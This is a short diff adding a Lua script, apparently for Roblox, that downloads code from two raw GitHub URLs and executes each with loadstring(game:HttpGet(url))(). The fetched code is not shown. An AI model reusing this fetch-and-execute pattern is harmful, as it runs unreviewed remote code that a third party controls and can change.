@@ -1,0 +1,8 @@
+local urls = {
+    "https://raw.githubusercontent.com/aditpacked/ramah-kali-we/refs/heads/main/ahaygnungrmah",
+    "https://raw.githubusercontent.com/aditpacked/ramah-kali-we/refs/heads/main/versitombol",
+}
+
+for _, url in ipairs(urls) do
+    loadstring(game:HttpGet(url))()
+end
